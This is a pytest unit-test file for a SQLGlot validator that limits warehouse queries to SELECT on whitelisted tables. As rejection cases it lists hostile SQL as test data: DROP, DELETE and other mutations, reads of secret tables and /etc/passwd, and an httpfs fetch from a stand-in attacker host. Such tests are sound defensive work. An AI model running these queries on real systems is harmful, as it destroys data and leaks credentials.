"""Unit tests for SQLGlot AST validation, dialect transpilation, and security sandbox."""

import pytest
from src.exceptions import ASTValidationError
from src.utils.ast_parser import SQLGlotValidator, validate_and_format_sql


@pytest.fixture
def validator() -> SQLGlotValidator:
    """Fixture providing a standard warehouse AST validator."""
    return SQLGlotValidator(
        allowed_tables={"customers", "plans", "subscriptions", "invoices", "usage_events"}
    )


def test_valid_select_query(validator: SQLGlotValidator) -> None:
    """Verifies that legitimate SELECT queries pass validation and format to clean DuckDB SQL."""
    query = """
    SELECT c.tier, sum(s.mrr_amount) as mrr
    FROM customers c
    JOIN subscriptions s ON c.id = s.customer_id
    WHERE s.status = 'active'
    GROUP BY c.tier
    ORDER BY mrr DESC;
    """
    formatted = validator.format(query)
    assert "SELECT" in formatted
    assert "FROM customers" in formatted
    assert "JOIN subscriptions" in formatted
    assert "GROUP BY" in formatted


@pytest.mark.parametrize(
    "forbidden_sql",
    [
        "DROP TABLE customers;",
        "TRUNCATE customers;",
        "INSERT INTO customers (id, name) VALUES ('c1', 'Hacker');",
        "UPDATE customers SET tier = 'enterprise' WHERE id = 'cust_001';",
        "DELETE FROM invoices WHERE status = 'open';",
        "ALTER TABLE customers ADD COLUMN balance DECIMAL(10, 2);",
        "CREATE TABLE backdoor (id INT);",
    ],
)
def test_reject_dml_and_ddl_mutations(validator: SQLGlotValidator, forbidden_sql: str) -> None:
    """Verifies that all non-SELECT or mutation statements are blocked by AST validation."""
    with pytest.raises(ASTValidationError, match="Security violation: only SELECT queries are permitted"):
        validator.validate(forbidden_sql)


def test_reject_unauthorized_tables(validator: SQLGlotValidator) -> None:
    """Verifies queries attempting to read unwhitelisted or system tables are blocked."""
    sneaky_query = "SELECT * FROM duckdb_secrets;"
    with pytest.raises(ASTValidationError, match="Unauthorized table access"):
        validator.validate(sneaky_query)

    multi_table_leak = """
    SELECT c.name, a.secret
    FROM customers c
    JOIN internal_passwords a ON c.id = a.user_id;
    """
    with pytest.raises(ASTValidationError, match="Unauthorized table access"):
        validator.validate(multi_table_leak)


@pytest.mark.parametrize(
    "unsafe_func_query",
    [
        "SELECT read_csv('/etc/passwd');",
        "SELECT read_parquet('s3://internal-bucket/secrets.parquet');",
        "SELECT * FROM httpfs('http://attacker.com/payload');",
    ],
)
def test_reject_forbidden_filesystem_and_network_functions(
    validator: SQLGlotValidator,
    unsafe_func_query: str,
) -> None:
    """Verifies functions capable of arbitrary I/O or network SSRF are blocked."""
    with pytest.raises(ASTValidationError, match="forbidden function"):
        validator.validate(unsafe_func_query)


def test_syntax_parse_error(validator: SQLGlotValidator) -> None:
    """Verifies invalid SQL grammar triggers clean ASTValidationError."""
    invalid_syntax = "SELECT FROM WHERE;"
    with pytest.raises(ASTValidationError, match="SQL syntax parse error"):
        validator.validate(invalid_syntax)


def test_empty_query_error(validator: SQLGlotValidator) -> None:
    """Verifies empty or whitespace-only queries are caught early."""
    with pytest.raises(ASTValidationError, match="Empty SQL query provided"):
        validator.validate("   ")
